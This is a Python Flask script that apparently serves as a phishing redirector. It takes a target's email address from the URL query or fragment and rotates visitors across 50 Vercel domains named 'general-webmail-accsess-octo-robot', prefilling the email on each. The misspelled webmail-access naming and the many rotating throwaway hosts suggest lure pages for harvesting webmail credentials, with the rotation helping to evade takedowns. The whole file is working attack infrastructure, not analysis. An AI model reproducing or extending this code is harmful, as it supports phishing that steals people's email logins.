from flask import Flask, redirect, request, render_template_string
import os

app = Flask(__name__)
application = app

DOMAINS=[
'https://general-webmail-accsess-octo-robot.vercel.app',
'https://general-webmail-accsess-octo-robot-iota.vercel.app',
'https://general-webmail-accsess-octo-robot-xi.vercel.app',
'https://general-webmail-accsess-octo-robot-dun-three.vercel.app',
'https://general-webmail-accsess-octo-robot-pi-dusky.vercel.app',
'https://general-webmail-accsess-octo-robot-gray.vercel.app',
'https://general-webmail-accsess-octo-robot-psi.vercel.app',
'https://general-webmail-accsess-octo-robot-steel.vercel.app',
'https://general-webmail-accsess-octo-robot-liart.vercel.app',
'https://general-webmail-accsess-octo-robot-ashy.vercel.app',
'https://general-webmail-accsess-octo-robot-livid.vercel.app',
'https://general-webmail-accsess-octo-robot-weld.vercel.app',
'https://general-webmail-accsess-octo-robot-rouge.vercel.app',
'https://general-webmail-accsess-octo-robot-five.vercel.app',
'https://general-webmail-accsess-octo-robot-olive.vercel.app',
'https://general-webmail-accsess-octo-robot-ruby.vercel.app',
'https://general-webmail-accsess-octo-robot-ten.vercel.app',
'https://general-webmail-accsess-octo-robot-three.vercel.app',
'https://general-webmail-accsess-octo-robot-blond.vercel.app',
'https://general-webmail-accsess-octo-robot-zeta.vercel.app',
'https://general-webmail-accsess-octo-robot-murex.vercel.app',
'https://general-webmail-accsess-octo-robot-indol.vercel.app',
'https://general-webmail-accsess-octo-robot-nu.vercel.app',
'https://general-webmail-accsess-octo-robot-chi-eight.vercel.app',
'https://general-webmail-accsess-octo-robot-rust.vercel.app',
'https://general-webmail-accsess-octo-robot-six.vercel.app',
'https://general-webmail-accsess-octo-robot-seven.vercel.app',
'https://general-webmail-accsess-octo-robot-kohl.vercel.app',
'https://general-webmail-accsess-octo-robot-one.vercel.app',
'https://general-webmail-accsess-octo-robot-wine-nu.vercel.app',
'https://general-webmail-accsess-octo-robot-rho.vercel.app',
'https://general-webmail-accsess-octo-robot-omega.vercel.app',
'https://general-webmail-accsess-octo-robot-orcin.vercel.app',
'https://general-webmail-accsess-octo-robot-indol-six.vercel.app',
'https://general-webmail-accsess-octo-robot-two.vercel.app',
'https://general-webmail-accsess-octo-robot-plum.vercel.app',
'https://general-webmail-accsess-octo-robot-eta.vercel.app',
'https://general-webmail-accsess-octo-robot-pi.vercel.app',
'https://general-webmail-accsess-octo-robot-phi.vercel.app',
'https://general-webmail-accsess-octo-robot-ochre.vercel.app',
'https://general-webmail-accsess-octo-robot-alpha.vercel.app',
'https://general-webmail-accsess-octo-robot-eight.vercel.app',
'https://general-webmail-accsess-octo-robot-dun.vercel.app',
'https://general-webmail-accsess-octo-robot-wheat.vercel.app',
'https://general-webmail-accsess-octo-robot-livid-tau.vercel.app',
'https://general-webmail-accsess-octo-robot-sage.vercel.app',
'https://general-webmail-accsess-octo-robot-pearl.vercel.app',
'https://general-webmail-accsess-octo-robot-theta.vercel.app',
'https://general-webmail-accsess-octo-robot-gamma.vercel.app',
'https://general-webmail-accsess-octo-robot-henna.vercel.app'
]


# Initialize counter
current_index = 0

@app.route('/')
def round_robin_balancer():
    global current_index
    
    # Try to get email from query parameter first (?web=email@email.com)
    email = request.args.get('web', '')
    
    # If no query parameter, serve a page that can handle the fragment
    if not email:
        return render_template_string('''
            <script>
                // Check if there's a fragment in the URL
                if (window.location.hash) {
                    var email = window.location.hash.substring(1); // Remove the '#'
                    // Redirect to the same URL with ?web= parameter instead of #
                    window.location.href = '/?web=' + encodeURIComponent(email);
                } else {
                    document.write('Invalid email');
                }
            </script>
        ''')
    
    # Basic email validation
    if not email or '@' not in email or '.' not in email:
        return "Invalid email.", 400
    
    # Get next domain in round-robin sequence
    target_domain = DOMAINS[current_index]
    
    # Increment index for next request
    current_index = (current_index + 1) % len(DOMAINS)
    
    # Construct target URL with the required ?web= parameter format
    target_url = f"{target_domain}/?web={email}"
    
    # Instant redirect
    return redirect(target_url, code=302)

if __name__ == '__main__':
    app.run(debug=True)